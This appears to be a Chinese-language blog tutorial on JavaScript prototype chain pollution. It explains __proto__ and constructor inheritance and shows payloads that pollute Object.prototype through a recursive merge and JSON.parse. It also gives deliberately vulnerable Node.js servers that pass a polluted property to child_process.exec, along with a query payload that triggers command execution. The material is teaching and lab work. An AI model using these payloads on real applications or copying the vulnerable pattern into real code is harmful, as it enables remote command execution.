@@ -1,0 +1,523 @@
+
+
+<!DOCTYPE html>
+<html lang="en" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>JS 原型链污染 - 你好我是王日天@</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  
+  <meta name="description" content="1@ 前言最近开始着手编程能力的提高，主要学习和复习一...">
+  <meta name="author" content="rt95">
+  <link rel="icon" href="/images/favicon.ico" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/favicon-144x144.png">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1445822_s6x2xcokxrl.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: '/images/loading.gif'
+      },
+      donate: {
+        enable: true,
+        alipay: '/image/95.jpg',
+        wechat: '/image/95.jpg'
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: false
+      },
+      preview: {
+        background: {
+          default: '/images/welcome-image.jpg',
+          api: ''
+        },
+        motto: {
+          default: '我在开了灯的床头下，想问问自己的心啊。',
+          api: 'https://v2.jinrishici.com/one.json',
+          data_contents: '["data","content"]'
+        },
+      },
+      qrcode: {
+        enable: true,
+        type: 'url',
+        image: 'https://pic.izhaoo.com/weapp-code.jpg',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        model: 'simple'
+      },
+      notification: {
+        enable: false,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="lock-screen">
+  <div class="loading"></div>
+  
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+    </div>
+    <div class="center">JS 原型链污染</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+      <div id="qrcode-navbar"></div>
+    
+  </nav>
+
+  
+
+<nav class="menu">
+  <div class="menu-wrap">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/archives " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/links " class="underline "> links</a>
+      </li><li class="menu-item">
+        <a href="/about " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="/images/post-image.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">JS 原型链污染</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>September 09, 2019</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>15963</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        <h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1@ 前言"></a>1@ 前言</h1><p>最近开始着手编程能力的提高，主要学习和复习一些前端的知识。之前看到过 p 神博客中写到的 js 的原型链污染问题，于是自己进行了一定程度的学习和尝试，写下我的总结，供各位同学们参阅。</p>
+<h1 id="2-JS-的原型继承机制"><a href="#2-JS-的原型继承机制" class="headerlink" title="2@ JS 的原型继承机制"></a>2@ JS 的原型继承机制</h1><p>基础知识我在此就不做过多介绍了，还有所疑惑的同学可以<a href="https://blog.wonderkun.cc/2019/07/18/javascript%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#more" target="_blank" rel="noopener">戳这</a>,亦或是<a href="https://juejin.im/entry/58dfbe0361ff4b006b166388" target="_blank" rel="noopener">戳这</a>。</p>
+<p>这里只简单说下我对 js 继承方法的理解。平常我们学到的大部分面向对象的语言都有类机制，也大多都有 class 这个关键字。而 js 大多还是使用最原生的原型链继承的方法，尽管 class 关键字已经被引入。</p>
+<blockquote>
+<p>新的关键字<code>class</code>从ES6开始正式被引入到JavaScript中。<code>class</code>的目的就是让定义类更简单。</p>
+</blockquote>
+<p>实际上，class 继承机制仍旧是原型继承实现的。</p>
+<p>我们现在拿一个其他具有类机制的语言看下，这里使用 python 做例子。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span><span class="hljs-params">()</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self,name,age)</span>:</span><br>        self.name = name<br>        self.age = age<br>        self.money = <span class="hljs-number">1000</span><br><br>person = Person(<span class="hljs-string">'rt95'</span>,<span class="hljs-number">20</span>)<br>print(person.money) // <span class="hljs-number">1000</span><br>print(person.name) // rt95<br></code></pre></td></tr></table></figure>
+
+<p>这里的继承机制很明显，person 这个对象的生成类就是 Person() 类，类中的一切方法和属性都被对象继承，亦可以被 extends 的子类继承。</p>
+<p>反观一下 Js 中的继承例子</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Person</span>(<span class="hljs-params">name, age</span>) </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>        <span class="hljs-keyword">this</span>.age = age;<br>&#125;<br>Person.prototype.money = <span class="hljs-number">1000</span>;<br><span class="hljs-keyword">var</span> person = <span class="hljs-keyword">new</span> Person(<span class="hljs-string">"rt95"</span>, <span class="hljs-number">20</span>);<br><span class="hljs-built_in">console</span>.log(person.money);<br><span class="hljs-built_in">console</span>.log(person.name);<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<p> <img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/1.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">1.png</span></p>
+<p>我们一般理解的是对象直接由类构造而来，而且构造函数是在类里面的一个方法。但是 Js 却恰恰相反，它的构造函数在外面，而真正的类被包含在构造函数里面，属于构造函数的一个属性 <strong>prototype</strong>,所以刚开始的时候用 Js 的对象和原型的时候会感觉到特别的蹩脚。</p>
+<p>我们可以这样来理解，以上面的例子为主，我们现在有一个对象 person ，它的类就是构造函数中的 Person.prototype, 而这个类的构造函数就是 Person()，其中：</p>
+<p><code>Person.prototype 和 person.__proto__</code> 指向的都是普通意义上 person 对象的类。用之前的面向对象思维理解 Js 的继承机制，可能会是个好办法，如果不喜欢这种办法，就按你舒服的方法来理解。</p>
+<h2 id="2-1-constructor"><a href="#2-1-constructor" class="headerlink" title="2.1 constructor"></a>2.1 constructor</h2><p>这里再提一个小点，我们在其他前端开发的代码中经常会看见类似下面的代码：</p>
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">Student.prototype<span class="hljs-function">.<span class="hljs-keyword">constructor</span> = <span class="hljs-title">Student</span>;</span><br></code></pre></td></tr></table></figure>
+
+<p>类似场景大部分出现在构造函数中的原型直接使用了其他构造函数的原型生成对象，如下代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Person</span>(<span class="hljs-params">name</span>) </span>&#123;<br>    <span class="hljs-keyword">this</span>.name = name;<br>&#125;  <br><br>Person.prototype.copy = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;  <br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.constructor();<br>&#125;;  <br><br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Student</span>(<span class="hljs-params">name</span>) </span>&#123;  <br>    Person.call(<span class="hljs-keyword">this</span>, name);<br>&#125;  <br><br><br>Student.prototype = <span class="hljs-built_in">Object</span>.create(Person.prototype);<br></code></pre></td></tr></table></figure>
+
+<p>上述代码在 Student 构造函数里面直接调用了 Person 构造函数的方法，而且构造函数的原型也直接改为了用 Person 构造函数原型创建的一个对象，即当下所有以 Student 这个构造函数构造的对象会继承所有 Person() 构造函数里面的属性和方法，可是，坏就坏在所有上面了，我们来继续看看下面的这个对象生成：</p>
+<p> <img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/2.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">2.png</span></p>
+<p>本来变量 rt95 就是 Student 这个构造函数创建的，只不过它内部使用了 Person 构造函数的方法和继承了一些属性，所以于情于理我们需要将这一点更改过来，使新创建对象们都能认识到自己真正的祖宗是谁！！！</p>
+<p>我们再来手动的更改一下这个构造函数的对象的属性，使用下面的例子做演示：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Foreign</span>(<span class="hljs-params">shame</span>) </span>&#123;<br>      <span class="hljs-keyword">this</span>.shame = shame;<br> &#125;<br><br>Foreign.prototype.copy = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.constructor();<br> &#125;;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">China</span>(<span class="hljs-params">name, shame</span>) </span>&#123;<br>      Foreign.call(<span class="hljs-keyword">this</span>, shame);<br>      <span class="hljs-keyword">this</span>.name = name;<br> &#125;<br><br><br>China.prototype = <span class="hljs-built_in">Object</span>.create(Foreign.prototype);<br>China.prototype.constructor = China;<br></code></pre></td></tr></table></figure>
+
+
+
+<p> <img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/3.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">3.png</span></p>
+<p>所以不光是人需要，代码也需要认清自己真正的祖先，否则会造成很多的麻烦。</p>
+<h1 id="3-Js-中的原型链污染"><a href="#3-Js-中的原型链污染" class="headerlink" title="3@ Js 中的原型链污染"></a>3@ Js 中的原型链污染</h1><p>这里我们就拿 p 神博客中的例子来一起探讨一下原型链污染的问题</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">merge</span>(<span class="hljs-params">target, source</span>) </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            merge(target[key], source[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>函数描述的就是合并两个对象。</p>
+<p>我们先使用原文给出的第一种 payload :</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> o1 = &#123;&#125;<br><span class="hljs-keyword">var</span> o2 = &#123;<span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-string">"__proto__"</span>: &#123;<span class="hljs-attr">b</span>: <span class="hljs-number">2</span>&#125;&#125;<br>merge(o1, o2)<br></code></pre></td></tr></table></figure>
+
+
+
+<p> <img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/4.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">4.png</span></p>
+<p>可以看到，这种方式合并对象，js 引擎是把  _<em>proto_</em> 当做了真正的对象的原型指向的属性，所以里面的值会被附在 o1 对象的属性上面，不会污染原型链。</p>
+<p>我们再看第二个 payload :</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> o1 = &#123;&#125;<br><span class="hljs-keyword">let</span> o2 = <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span>)<br>merge(o1, o2)<br></code></pre></td></tr></table></figure>
+
+<p><img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/5.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">5.png</span></p>
+<p>这里我们看到 b 的值已经成功被写入到了原型链中了，下面我们看看这两种不同处理的数据到底区别在哪。</p>
+<h2 id="3-1-真假-proto"><a href="#3-1-真假-proto" class="headerlink" title="3.1 真假 _proto_"></a>3.1 真假 _<em>proto_</em></h2><p>我们都知道，js 中每个对象都有自己的 _<em>proto_</em>,也就是它的原型，包括它的原型也具有这个属性。而这条继承链的终点就是 Object.prototype , 这也很容易验证：</p>
+<p> <img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/6.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">6.png</span></p>
+<p>那么如果我们能控制继承链终点的这个对象的属性，那么所有之后代码中生成的对象都会继承，也就此形成了原型链污染。那么我们有什么办法可以来向这个终点对象写入属性呢？</p>
+<p>我们首先尝试一下直接覆盖最终对象的 __proto__：</p>
+<p> <img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/7.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">7.png</span></p>
+<p>我们看到，虽然已经写进来了，但是并不是写到了终点对象的属性里面，也就是说，生成对象的原型的原型才是我们真正要操作的那个对象。那么现在我们想一下，这种办法生成的 __proto__ 属性永远都不可能是最终的那个对象的  __proto__,为什么呢？因为用这种方法构造出来的原型，其实还是调用了一次 Object 这个构造函数，那么最少也只能是二次继承终点对象。我们用这种方法覆盖 __proto__的方法是不成立的。</p>
+<p>那么有什么办法，我们构造的这个 __proto__会被认定为最终对象的 __proto__ 呢？目前没有直接修改的办法，因为我们不可能通过一次修改来改变系统保留的 __proto__ 属性，排除 那种直接可以操控的办法：</p>
+<p><code>xxx.__proto__.xxx = xxx</code></p>
+<p>但是我们可以构造一个普通的非系统保留的 __proto__ 属性，然后通过合并的方式来达到我们的目的。什么方法？上文已经提到了，就是 JSON.parse() 这个方法，因为解析这个 json 格式的字符串是从整体来看的，那么里面的 __proto__ 属性可以被解析为一个对象的普通属性。</p>
+<p> <img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/8.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">8.png</span></p>
+<p>通过对象颜色也可以看出来， 此时的这个 test对象，已经拥有了一个非系统保留的 __proto__ 属性，我们可以用下面的方法来检验：</p>
+<p> <img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/9.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">9.png</span></p>
+<p>那么我们可以通过键名合并的方式来将这个<code>假的</code> __proto__ 合并到 <code>真的</code> __proto__ 上面。调用上面的 merge() 方法实现。</p>
+<h2 id="3-2-其他的几种攻击场景"><a href="#3-2-其他的几种攻击场景" class="headerlink" title="3.2 其他的几种攻击场景"></a>3.2 其他的几种攻击场景</h2><h3 id="1、-控制了多个参数"><a href="#1、-控制了多个参数" class="headerlink" title="1、 控制了多个参数"></a>1、 控制了多个参数</h3><p>想象一下这个场景，用户可以控制对象的 3 个以上的参数，那么我们将直接有机会来改变终点原型的属性：</p>
+<p> <img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/10.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">10.png</span></p>
+<p>或者是两个参数：</p>
+<p> <img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/11.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">11.png</span></p>
+<p>这是一种通过已实例化的对象来进行回溯原型污染，还可以是下面这种直接操作构造函数的形式：</p>
+<p><img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/12.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">12</span></p>
+<p>当我们可操控的对象不是最终 Object 构造函数形成的时候，我们可以使用 testObj.__proto__.__proto__ 这种方法来回溯。</p>
+<p>下面给出一个测试例子：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> url = <span class="hljs-built_in">require</span>(<span class="hljs-string">'url'</span>);<br><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">'http'</span>);<br><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>);<br><span class="hljs-keyword">var</span> exec = <span class="hljs-built_in">require</span>(<span class="hljs-string">'child_process'</span>).exec;<br><br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req,res</span>)</span>&#123;<br>        <span class="hljs-keyword">var</span> req_url = req.url;<br>        <span class="hljs-keyword">var</span> str_url = url.parse(req_url,<span class="hljs-literal">true</span>).query;<br>        <span class="hljs-keyword">var</span> path1 = <span class="hljs-built_in">String</span>(str_url.pathname1);<br>        <span class="hljs-keyword">var</span> path2 = <span class="hljs-built_in">String</span>(str_url.pathname2);<br>        <span class="hljs-keyword">var</span> value = <span class="hljs-built_in">String</span>(str_url.value);<br>        <span class="hljs-keyword">var</span> obj = &#123;<span class="hljs-attr">earth</span>:&#123;<span class="hljs-attr">country</span>:<span class="hljs-string">'UK'</span>&#125;&#125;;<br>        obj[path1][path2] = value;<br>        <span class="hljs-built_in">console</span>.log(obj)<br>        <span class="hljs-keyword">var</span> test = &#123;&#125;;<br>        exec(test.vul,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err,data,stderr</span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(err)&#123;<br>                <span class="hljs-built_in">console</span>.log(stderr);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">console</span>.log(data);<br>        &#125;<br>&#125;)&#125;).listen(<span class="hljs-number">1234</span>);<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<p>客户端：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">'http://127.0.0.1:1234'</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"get"</span>&gt;</span><br>pathname1:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"pathname1"</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>pathname2:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"pathname2"</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>value   :<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type:</span>"<span class="hljs-attr">text</span>" <span class="hljs-attr">name</span>=<span class="hljs-string">"value"</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">'submit'</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'submit'</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>我们访问客户端来构造利用 payload :</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">pathname1</span> = __proto__<br><span class="hljs-attr">pathname2</span> = a<br><span class="hljs-attr">value</span> = command<br></code></pre></td></tr></table></figure>
+
+
+
+<p> <img    class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/13.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">13</span></p>
+<h3 id="2、控制了路径赋值参数"><a href="#2、控制了路径赋值参数" class="headerlink" title="2、控制了路径赋值参数"></a>2、控制了路径赋值参数</h3><p>有的 api 里面有通过传入路径来给对象属性赋值的方法，如果部分参数可控，便可以达到原型链污染的目的，沿用上面的代码例子，我们引入 pathval 这个第三方 api，通过里面的 setPathVal 方法，来触发原型链污染的漏洞：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 服务端</span><br><span class="hljs-keyword">var</span> url = <span class="hljs-built_in">require</span>(<span class="hljs-string">'url'</span>);<br><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">'http'</span>);<br><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>);<br><span class="hljs-keyword">var</span> exec = <span class="hljs-built_in">require</span>(<span class="hljs-string">'child_process'</span>).exec;<br><span class="hljs-keyword">var</span> pathval = <span class="hljs-built_in">require</span>(<span class="hljs-string">'pathval'</span>);<br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req,res</span>)</span>&#123;<br>        <span class="hljs-keyword">var</span> req_url = req.url;<br>        <span class="hljs-keyword">var</span> str_url = url.parse(req_url,<span class="hljs-literal">true</span>).query;<br>        <span class="hljs-keyword">var</span> path1 = <span class="hljs-built_in">String</span>(str_url.pathname1);<br>        <span class="hljs-keyword">var</span> value = <span class="hljs-built_in">String</span>(str_url.value);<br>        <span class="hljs-keyword">var</span> obj = &#123;<span class="hljs-attr">earth</span>:&#123;<span class="hljs-attr">country</span>:<span class="hljs-string">'UK'</span>&#125;&#125;;<br>        pathval.setPathValue(obj,path1,value)<br>        <span class="hljs-keyword">var</span> test = &#123;&#125;;<br>        exec(test.vul,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err,data,stderr</span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(err)&#123;<br>                <span class="hljs-built_in">console</span>.log(stderr);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">console</span>.log(data);<br>        &#125;<br>&#125;)&#125;).listen(<span class="hljs-number">1234</span>);<br></code></pre></td></tr></table></figure>
+
+
+
